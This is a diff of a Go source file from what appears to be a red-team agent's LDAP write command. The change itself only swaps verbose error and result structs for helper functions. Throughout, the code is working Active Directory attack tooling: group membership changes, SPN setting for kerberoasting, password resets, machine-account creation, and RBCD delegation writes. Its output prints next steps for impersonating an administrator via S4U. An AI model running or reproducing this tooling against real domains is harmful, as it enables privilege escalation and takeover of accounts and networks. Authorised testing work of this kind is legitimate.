@@ -37,28 +37,16 @@ type ldapWriteArgs struct {
 func (c *LdapWriteCommand) Execute(task structs.Task) structs.CommandResult {
 	allActions := "add-member, remove-member, set-attr, add-attr, remove-attr, set-spn, disable, enable, set-password, add-computer, delete-object, set-rbcd, clear-rbcd, shadow-cred, clear-shadow-cred"
 	if task.Params == "" {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Error: parameters required. Use -action <%s> -server <DC>", allActions),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Error: parameters required. Use -action <%s> -server <DC>", allActions)
 	}
 
 	var args ldapWriteArgs
 	if err := json.Unmarshal([]byte(task.Params), &args); err != nil {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Error parsing parameters: %v", err),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Error parsing parameters: %v", err)
 	}
 
 	if args.Server == "" {
-		return structs.CommandResult{
-			Output:    "Error: server parameter required (domain controller IP or hostname)",
-			Status:    "error",
-			Completed: true,
-		}
+		return errorResult("Error: server parameter required (domain controller IP or hostname)")
 	}
 
 	if args.Port <= 0 {
@@ -80,20 +68,12 @@ func (c *LdapWriteCommand) Execute(task structs.Task) structs.CommandResult {
 		"shadow-cred": true, "clear-shadow-cred": true,
 	}
 	if !validActions[action] {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Unknown action: %s\nAvailable: %s", args.Action, allActions),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Unknown action: %s\nAvailable: %s", args.Action, allActions)
 	}
 
 	// set-password requires LDAPS
 	if action == "set-password" && !args.UseTLS {
-		return structs.CommandResult{
-			Output:    "Error: set-password requires LDAPS (-use_tls true). AD rejects password changes over unencrypted LDAP.",
-			Status:    "error",
-			Completed: true,
-		}
+		return errorResult("Error: set-password requires LDAPS (-use_tls true). AD rejects password changes over unencrypted LDAP.")
 	}
 
 	// Connect
@@ -102,21 +82,13 @@ func (c *LdapWriteCommand) Execute(task structs.Task) structs.CommandResult {
 		Username: args.Username, Password: args.Password,
 	})
 	if err != nil {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Error connecting to LDAP server %s:%d: %v", args.Server, args.Port, err),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Error connecting to LDAP server %s:%d: %v", args.Server, args.Port, err)
 	}
 	defer conn.Close()
 
 	// Bind
 	if err := ldapBind(conn, ldapQueryArgs{Username: args.Username, Password: args.Password}); err != nil {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Error binding to LDAP: %v", err),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Error binding to LDAP: %v", err)
 	}
 
 	// Determine base DN
@@ -124,11 +96,7 @@ func (c *LdapWriteCommand) Execute(task structs.Task) structs.CommandResult {
 	if baseDN == "" {
 		baseDN, err = detectBaseDN(conn)
 		if err != nil {
-			return structs.CommandResult{
-				Output:    fmt.Sprintf("Error detecting base DN: %v. Specify -base_dn manually.", err),
-				Status:    "error",
-				Completed: true,
-			}
+			return errorf("Error detecting base DN: %v. Specify -base_dn manually.", err)
 		}
 	}
 
@@ -165,7 +133,7 @@ func (c *LdapWriteCommand) Execute(task structs.Task) structs.CommandResult {
 		return ldapClearShadowCred(conn, args, baseDN)
 	default:
 		// Unreachable — action is validated before connection
-		return structs.CommandResult{Output: "Unknown action", Status: "error", Completed: true}
+		return errorResult("Unknown action")
 	}
 }
 
@@ -214,116 +182,68 @@ func ldapResolveDN(conn *ldap.Conn, name string, baseDN string) (string, error) 
 
 func ldapAddMember(conn *ldap.Conn, args ldapWriteArgs, baseDN string) structs.CommandResult {
 	if args.Target == "" || args.Group == "" {
-		return structs.CommandResult{
-			Output:    "Error: -target (user/computer to add) and -group (group name) are required",
-			Status:    "error",
-			Completed: true,
-		}
+		return errorResult("Error: -target (user/computer to add) and -group (group name) are required")
 	}
 
 	targetDN, err := ldapResolveDN(conn, args.Target, baseDN)
 	if err != nil {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Error resolving target: %v", err),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Error resolving target: %v", err)
 	}
 
 	groupDN, err := ldapResolveDN(conn, args.Group, baseDN)
 	if err != nil {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Error resolving group: %v", err),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Error resolving group: %v", err)
 	}
 
 	modReq := ldap.NewModifyRequest(groupDN, nil)
 	modReq.Add("member", []string{targetDN})
 
 	if err := conn.Modify(modReq); err != nil {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Error adding member: %v", err),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Error adding member: %v", err)
 	}
 
-	return structs.CommandResult{
-		Output: fmt.Sprintf("[*] LDAP Group Membership Modification (T1098)\n"+
+	return successf("[*] LDAP Group Membership Modification (T1098)\n"+
 			"[+] Added:  %s\n"+
 			"[+] To:     %s\n"+
-			"[+] Server: %s\n", targetDN, groupDN, args.Server),
-		Status:    "success",
-		Completed: true,
-	}
+			"[+] Server: %s\n", targetDN, groupDN, args.Server)
 }
 
 func ldapRemoveMember(conn *ldap.Conn, args ldapWriteArgs, baseDN string) structs.CommandResult {
 	if args.Target == "" || args.Group == "" {
-		return structs.CommandResult{
-			Output:    "Error: -target (user/computer to remove) and -group (group name) are required",
-			Status:    "error",
-			Completed: true,
-		}
+		return errorResult("Error: -target (user/computer to remove) and -group (group name) are required")
 	}
 
 	targetDN, err := ldapResolveDN(conn, args.Target, baseDN)
 	if err != nil {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Error resolving target: %v", err),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Error resolving target: %v", err)
 	}
 
 	groupDN, err := ldapResolveDN(conn, args.Group, baseDN)
 	if err != nil {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Error resolving group: %v", err),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Error resolving group: %v", err)
 	}
 
 	modReq := ldap.NewModifyRequest(groupDN, nil)
 	modReq.Delete("member", []string{targetDN})
 
 	if err := conn.Modify(modReq); err != nil {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Error removing member: %v", err),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Error removing member: %v", err)
 	}
 
-	return structs.CommandResult{
-		Output: fmt.Sprintf("[*] LDAP Group Membership Modification (T1098)\n"+
+	return successf("[*] LDAP Group Membership Modification (T1098)\n"+
 			"[+] Removed: %s\n"+
 			"[+] From:    %s\n"+
-			"[+] Server:  %s\n", targetDN, groupDN, args.Server),
-		Status:    "success",
-		Completed: true,
-	}
+			"[+] Server:  %s\n", targetDN, groupDN, args.Server)
 }
 
 func ldapSetAttr(conn *ldap.Conn, args ldapWriteArgs, baseDN string) structs.CommandResult {
 	if args.Target == "" || args.Attr == "" {
-		return structs.CommandResult{
-			Output:    "Error: -target (object to modify) and -attr (attribute name) are required",
-			Status:    "error",
-			Completed: true,
-		}
+		return errorResult("Error: -target (object to modify) and -attr (attribute name) are required")
 	}
 
 	targetDN, err := ldapResolveDN(conn, args.Target, baseDN)
 	if err != nil {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Error resolving target: %v", err),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Error resolving target: %v", err)
 	}
 
 	modReq := ldap.NewModifyRequest(targetDN, nil)
@@ -334,11 +254,7 @@ func ldapSetAttr(conn *ldap.Conn, args ldapWriteArgs, baseDN string) structs.Com
 	modReq.Replace(args.Attr, values)
 
 	if err := conn.Modify(modReq); err != nil {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Error setting attribute: %v", err),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Error setting attribute: %v", err)
 	}
 
 	valDisplay := args.Value
@@ -346,34 +262,22 @@ func ldapSetAttr(conn *ldap.Conn, args ldapWriteArgs, baseDN string) structs.Com
 		valDisplay = strings.Join(args.Values, ", ")
 	}
 
-	return structs.CommandResult{
-		Output: fmt.Sprintf("[*] LDAP Attribute Modification (T1098)\n"+
+	return successf("[*] LDAP Attribute Modification (T1098)\n"+
 			"[+] Target:    %s\n"+
 			"[+] Attribute: %s\n"+
 			"[+] Value:     %s\n"+
 			"[+] Operation: REPLACE\n"+
-			"[+] Server:    %s\n", targetDN, args.Attr, valDisplay, args.Server),
-		Status:    "success",
-		Completed: true,
-	}
+			"[+] Server:    %s\n", targetDN, args.Attr, valDisplay, args.Server)
 }
 
 func ldapAddAttr(conn *ldap.Conn, args ldapWriteArgs, baseDN string) structs.CommandResult {
 	if args.Target == "" || args.Attr == "" {
-		return structs.CommandResult{
-			Output:    "Error: -target (object to modify) and -attr (attribute name) are required",
-			Status:    "error",
-			Completed: true,
-		}
+		return errorResult("Error: -target (object to modify) and -attr (attribute name) are required")
 	}
 
 	targetDN, err := ldapResolveDN(conn, args.Target, baseDN)
 	if err != nil {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Error resolving target: %v", err),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Error resolving target: %v", err)
 	}
 
 	modReq := ldap.NewModifyRequest(targetDN, nil)
@@ -384,11 +288,7 @@ func ldapAddAttr(conn *ldap.Conn, args ldapWriteArgs, baseDN string) structs.Com
 	modReq.Add(args.Attr, values)
 
 	if err := conn.Modify(modReq); err != nil {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Error adding attribute value: %v", err),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Error adding attribute value: %v", err)
 	}
 
 	valDisplay := args.Value
@@ -396,34 +296,22 @@ func ldapAddAttr(conn *ldap.Conn, args ldapWriteArgs, baseDN string) structs.Com
 		valDisplay = strings.Join(args.Values, ", ")
 	}
 
-	return structs.CommandResult{
-		Output: fmt.Sprintf("[*] LDAP Attribute Modification (T1098)\n"+
+	return successf("[*] LDAP Attribute Modification (T1098)\n"+
 			"[+] Target:    %s\n"+
 			"[+] Attribute: %s\n"+
 			"[+] Value:     %s\n"+
 			"[+] Operation: ADD\n"+
-			"[+] Server:    %s\n", targetDN, args.Attr, valDisplay, args.Server),
-		Status:    "success",
-		Completed: true,
-	}
+			"[+] Server:    %s\n", targetDN, args.Attr, valDisplay, args.Server)
 }
 
 func ldapRemoveAttr(conn *ldap.Conn, args ldapWriteArgs, baseDN string) structs.CommandResult {
 	if args.Target == "" || args.Attr == "" {
-		return structs.CommandResult{
-			Output:    "Error: -target (object to modify) and -attr (attribute name) are required",
-			Status:    "error",
-			Completed: true,
-		}
+		return errorResult("Error: -target (object to modify) and -attr (attribute name) are required")
 	}
 
 	targetDN, err := ldapResolveDN(conn, args.Target, baseDN)
 	if err != nil {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Error resolving target: %v", err),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Error resolving target: %v", err)
 	}
 
 	modReq := ldap.NewModifyRequest(targetDN, nil)
@@ -434,11 +322,7 @@ func ldapRemoveAttr(conn *ldap.Conn, args ldapWriteArgs, baseDN string) structs.
 	modReq.Delete(args.Attr, values)
 
 	if err := conn.Modify(modReq); err != nil {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Error removing attribute value: %v", err),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Error removing attribute value: %v", err)
 	}
 
 	valDisplay := args.Value
@@ -449,75 +333,47 @@ func ldapRemoveAttr(conn *ldap.Conn, args ldapWriteArgs, baseDN string) structs.
 		valDisplay = "(all values)"
 	}
 
-	return structs.CommandResult{
-		Output: fmt.Sprintf("[*] LDAP Attribute Modification (T1098)\n"+
+	return successf("[*] LDAP Attribute Modification (T1098)\n"+
 			"[+] Target:    %s\n"+
 			"[+] Attribute: %s\n"+
 			"[+] Value:     %s\n"+
 			"[+] Operation: DELETE\n"+
-			"[+] Server:    %s\n", targetDN, args.Attr, valDisplay, args.Server),
-		Status:    "success",
-		Completed: true,
-	}
+			"[+] Server:    %s\n", targetDN, args.Attr, valDisplay, args.Server)
 }
 
 func ldapSetSPN(conn *ldap.Conn, args ldapWriteArgs, baseDN string) structs.CommandResult {
 	if args.Target == "" || args.Value == "" {
-		return structs.CommandResult{
-			Output:    "Error: -target (account) and -value (SPN, e.g. MSSQLSvc/host.domain.local) are required",
-			Status:    "error",
-			Completed: true,
-		}
+		return errorResult("Error: -target (account) and -value (SPN, e.g. MSSQLSvc/host.domain.local) are required")
 	}
 
 	targetDN, err := ldapResolveDN(conn, args.Target, baseDN)
 	if err != nil {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Error resolving target: %v", err),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Error resolving target: %v", err)
 	}
 
 	modReq := ldap.NewModifyRequest(targetDN, nil)
 	modReq.Add("servicePrincipalName", []string{args.Value})
 
 	if err := conn.Modify(modReq); err != nil {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Error setting SPN: %v", err),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Error setting SPN: %v", err)
 	}
 
-	return structs.CommandResult{
-		Output: fmt.Sprintf("[*] LDAP SPN Modification (T1134)\n"+
+	return successf("[*] LDAP SPN Modification (T1134)\n"+
 			"[+] Target: %s\n"+
 			"[+] SPN:    %s\n"+
 			"[+] Server: %s\n"+
 			"\n[!] Account is now kerberoastable — use kerberoast to extract TGS hash.\n",
-			targetDN, args.Value, args.Server),
-		Status:    "success",
-		Completed: true,
-	}
+			targetDN, args.Value, args.Server)
 }
 
 func ldapToggleAccount(conn *ldap.Conn, args ldapWriteArgs, baseDN string, disable bool) structs.CommandResult {
 	if args.Target == "" {
-		return structs.CommandResult{
-			Output:    "Error: -target (account to disable/enable) is required",
-			Status:    "error",
-			Completed: true,
-		}
+		return errorResult("Error: -target (account to disable/enable) is required")
 	}
 
 	targetDN, err := ldapResolveDN(conn, args.Target, baseDN)
 	if err != nil {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Error resolving target: %v", err),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Error resolving target: %v", err)
 	}
 
 	// Read current userAccountControl
@@ -533,21 +389,13 @@ func ldapToggleAccount(conn *ldap.Conn, args ldapWriteArgs, baseDN string, disab
 
 	result, err := conn.Search(searchReq)
 	if err != nil || len(result.Entries) == 0 {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Error reading userAccountControl: %v", err),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Error reading userAccountControl: %v", err)
 	}
 
 	uacStr := result.Entries[0].GetAttributeValue("userAccountControl")
 	uac, err := strconv.Atoi(uacStr)
 	if err != nil {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Error parsing userAccountControl value %q: %v", uacStr, err),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Error parsing userAccountControl value %q: %v", uacStr, err)
 	}
 
 	const accountDisable = 0x0002
@@ -566,48 +414,28 @@ func ldapToggleAccount(conn *ldap.Conn, args ldapWriteArgs, baseDN string, disab
 	modReq.Replace("userAccountControl", []string{fmt.Sprintf("%d", newUAC)})
 
 	if err := conn.Modify(modReq); err != nil {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Error modifying userAccountControl: %v", err),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Error modifying userAccountControl: %v", err)
 	}
 
-	return structs.CommandResult{
-		Output: fmt.Sprintf("[*] LDAP Account Control Modification (T1098)\n"+
+	return successf("[*] LDAP Account Control Modification (T1098)\n"+
 			"[+] Target: %s\n"+
 			"[+] Action: %s\n"+
 			"[+] UAC:    0x%04X → 0x%04X\n"+
-			"[+] Server: %s\n", targetDN, actionStr, uac, newUAC, args.Server),
-		Status:    "success",
-		Completed: true,
-	}
+			"[+] Server: %s\n", targetDN, actionStr, uac, newUAC, args.Server)
 }
 
 func ldapSetPassword(conn *ldap.Conn, args ldapWriteArgs, baseDN string) structs.CommandResult {
 	if args.Target == "" || args.Value == "" {
-		return structs.CommandResult{
-			Output:    "Error: -target (account) and -value (new password) are required. Requires LDAPS.",
-			Status:    "error",
-			Completed: true,
-		}
+		return errorResult("Error: -target (account) and -value (new password) are required. Requires LDAPS.")
 	}
 
 	if !args.UseTLS {
-		return structs.CommandResult{
-			Output:    "Error: set-password requires LDAPS (-use_tls true). AD rejects password changes over unencrypted LDAP.",
-			Status:    "error",
-			Completed: true,
-		}
+		return errorResult("Error: set-password requires LDAPS (-use_tls true). AD rejects password changes over unencrypted LDAP.")
 	}
 
 	targetDN, err := ldapResolveDN(conn, args.Target, baseDN)
 	if err != nil {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Error resolving target: %v", err),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Error resolving target: %v", err)
 	}
 
 	// AD password format: UTF-16LE encoded, surrounded by double quotes
@@ -622,38 +450,22 @@ func ldapSetPassword(conn *ldap.Conn, args ldapWriteArgs, baseDN string) structs
 	modReq.Replace("unicodePwd", []string{string(utf16Pwd)})
 
 	if err := conn.Modify(modReq); err != nil {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Error setting password: %v", err),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Error setting password: %v", err)
 	}
 
-	return structs.CommandResult{
-		Output: fmt.Sprintf("[*] LDAP Password Change (T1098)\n"+
-			"[+] Target:   %s\n"+
-			"[+] Password: (set successfully)\n"+
-			"[+] Server:   %s\n", targetDN, args.Server),
-		Status:    "success",
-		Completed: true,
-	}
+	return successf("[*] LDAP Password Change (T1098)\n"+
+		"[+] Target:   %s\n"+
+		"[+] Password: (set successfully)\n"+
+		"[+] Server:   %s\n", targetDN, args.Server)
 }
 
 func ldapAddComputer(conn *ldap.Conn, args ldapWriteArgs, baseDN string) structs.CommandResult {
 	if args.Target == "" {
-		return structs.CommandResult{
-			Output:    "Error: -target (computer name, without trailing $) is required",
-			Status:    "error",
-			Completed: true,
-		}
+		return errorResult("Error: -target (computer name, without trailing $) is required")
 	}
 
 	if args.Value == "" && args.UseTLS {
-		return structs.CommandResult{
-			Output:    "Error: -value (password for the computer account) is required when using LDAPS",
-			Status:    "error",
-			Completed: true,
-		}
+		return errorResult("Error: -value (password for the computer account) is required when using LDAPS")
 	}
 
 	// Normalize: ensure sAMAccountName ends with $
@@ -702,11 +514,7 @@ func ldapAddComputer(conn *ldap.Conn, args ldapWriteArgs, baseDN string) structs
 	}
 
 	if err := conn.Add(addReq); err != nil {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Error creating computer account: %v", err),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Error creating computer account: %v", err)
 	}
 
 	pwdStatus := "(set)"
@@ -718,8 +526,7 @@ func ldapAddComputer(conn *ldap.Conn, args ldapWriteArgs, baseDN string) structs
 		extraNote = "\n[!] Password not set (requires LDAPS). For RBCD, this is fine — S4U uses the machine account hash.\n"
 	}
 
-	return structs.CommandResult{
-		Output: fmt.Sprintf("[*] LDAP Computer Account Creation (T1136.002)\n"+
+	return successf("[*] LDAP Computer Account Creation (T1136.002)\n"+
 			"[+] DN:            %s\n"+
 			"[+] sAMAccountName: %s\n"+
 			"[+] Password:      %s\n"+
@@ -728,74 +535,43 @@ func ldapAddComputer(conn *ldap.Conn, args ldapWriteArgs, baseDN string) structs
 			"%s"+
 			"\n[!] Next: ldap-write -action set-rbcd -target <victim> -value %s\n"+
 			"[!] Then: ticket -action s4u -target <victim> -impersonate administrator\n",
-			computerDN, samName, pwdStatus, uacStr, args.Server, extraNote, samName),
-		Status:    "success",
-		Completed: true,
-	}
+			computerDN, samName, pwdStatus, uacStr, args.Server, extraNote, samName)
 }
 
 func ldapDeleteObject(conn *ldap.Conn, args ldapWriteArgs, baseDN string) structs.CommandResult {
 	if args.Target == "" {
-		return structs.CommandResult{
-			Output:    "Error: -target (object to delete — sAMAccountName, CN, or full DN) is required",
-			Status:    "error",
-			Completed: true,
-		}
+		return errorResult("Error: -target (object to delete — sAMAccountName, CN, or full DN) is required")
 	}
 
 	targetDN, err := ldapResolveDN(conn, args.Target, baseDN)
 	if err != nil {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Error resolving target: %v", err),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Error resolving target: %v", err)
 	}
 
 	delReq := ldap.NewDelRequest(targetDN, nil)
 	if err := conn.Del(delReq); err != nil {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Error deleting object: %v", err),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Error deleting object: %v", err)
 	}
 
-	return structs.CommandResult{
-		Output: fmt.Sprintf("[*] LDAP Object Deletion\n"+
+	return successf("[*] LDAP Object Deletion\n"+
 			"[+] Deleted: %s\n"+
-			"[+] Server:  %s\n", targetDN, args.Server),
-		Status:    "success",
-		Completed: true,
-	}
+			"[+] Server:  %s\n", targetDN, args.Server)
 }
 
 func ldapSetRBCD(conn *ldap.Conn, args ldapWriteArgs, baseDN string) structs.CommandResult {
 	if args.Target == "" || args.Value == "" {
-		return structs.CommandResult{
-			Output:    "Error: -target (victim service account/computer) and -value (delegated account sAMAccountName, e.g. FAKEPC01$) are required",
-			Status:    "error",
-			Completed: true,
-		}
+		return errorResult("Error: -target (victim service account/computer) and -value (delegated account sAMAccountName, e.g. FAKEPC01$) are required")
 	}
 
 	targetDN, err := ldapResolveDN(conn, args.Target, baseDN)
 	if err != nil {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Error resolving target: %v", err),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Error resolving target: %v", err)
 	}
 
 	// Resolve the delegated account and get its objectSid
 	delegatedDN, err := ldapResolveDN(conn, args.Value, baseDN)
 	if err != nil {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Error resolving delegated account '%s': %v", args.Value, err),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Error resolving delegated account '%s': %v", args.Value, err)
 	}
 
 	// Fetch the objectSid of the delegated account
@@ -811,20 +587,12 @@ func ldapSetRBCD(conn *ldap.Conn, args ldapWriteArgs, baseDN string) structs.Com
 
 	result, err := conn.Search(searchReq)
 	if err != nil || len(result.Entries) == 0 {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Error fetching objectSid for '%s': %v", args.Value, err),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Error fetching objectSid for '%s': %v", args.Value, err)
 	}
 
 	sid := result.Entries[0].GetRawAttributeValue("objectSid")
 	if len(sid) < 8 {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Error: invalid objectSid for '%s' (length %d)", args.Value, len(sid)),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Error: invalid objectSid for '%s' (length %d)", args.Value, len(sid))
 	}
 
 	// Build self-relative security descriptor with DACL granting GENERIC_ALL to the SID
@@ -836,43 +604,27 @@ func ldapSetRBCD(conn *ldap.Conn, args ldapWriteArgs, baseDN string) structs.Com
 	modReq.Replace("msDS-AllowedToActOnBehalfOfOtherIdentity", []string{string(sd)})
 
 	if err := conn.Modify(modReq); err != nil {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Error setting RBCD delegation: %v", err),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Error setting RBCD delegation: %v", err)
 	}
 
-	return structs.CommandResult{
-		Output: fmt.Sprintf("[*] LDAP RBCD Configuration (T1134.001)\n"+
-			"[+] Target:    %s\n"+
-			"[+] Delegated: %s (%s)\n"+
-			"[+] SID:       %s\n"+
-			"[+] Server:    %s\n"+
-			"\n[!] %s can now impersonate users to services on %s\n"+
-			"[!] Next: ticket -action s4u ...\n",
-			targetDN, delegatedDN, args.Value, sidStr, args.Server, args.Value, args.Target),
-		Status:    "success",
-		Completed: true,
-	}
+	return successf("[*] LDAP RBCD Configuration (T1134.001)\n"+
+		"[+] Target:    %s\n"+
+		"[+] Delegated: %s (%s)\n"+
+		"[+] SID:       %s\n"+
+		"[+] Server:    %s\n"+
+		"\n[!] %s can now impersonate users to services on %s\n"+
+		"[!] Next: ticket -action s4u ...\n",
+		targetDN, delegatedDN, args.Value, sidStr, args.Server, args.Value, args.Target)
 }
 
 func ldapClearRBCD(conn *ldap.Conn, args ldapWriteArgs, baseDN string) structs.CommandResult {
 	if args.Target == "" {
-		return structs.CommandResult{
-			Output:    "Error: -target (object to clear RBCD from) is required",
-			Status:    "error",
-			Completed: true,
-		}
+		return errorResult("Error: -target (object to clear RBCD from) is required")
 	}
 
 	targetDN, err := ldapResolveDN(conn, args.Target, baseDN)
 	if err != nil {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Error resolving target: %v", err),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Error resolving target: %v", err)
 	}
 
 	// Clear msDS-AllowedToActOnBehalfOfOtherIdentity by replacing with empty value
@@ -880,21 +632,13 @@ func ldapClearRBCD(conn *ldap.Conn, args ldapWriteArgs, baseDN string) structs.C
 	modReq.Replace("msDS-AllowedToActOnBehalfOfOtherIdentity", []string{})
 
 	if err := conn.Modify(modReq); err != nil {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Error clearing RBCD delegation: %v", err),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Error clearing RBCD delegation: %v", err)
 	}
 
-	return structs.CommandResult{
-		Output: fmt.Sprintf("[*] LDAP RBCD Cleared\n"+
+	return successf("[*] LDAP RBCD Cleared\n"+
 			"[+] Target: %s\n"+
 			"[+] Cleared: msDS-AllowedToActOnBehalfOfOtherIdentity\n"+
-			"[+] Server: %s\n", targetDN, args.Server),
-		Status:    "success",
-		Completed: true,
-	}
+			"[+] Server: %s\n", targetDN, args.Server)
 }
 
 // buildRBCDSecurityDescriptor creates a self-relative security descriptor
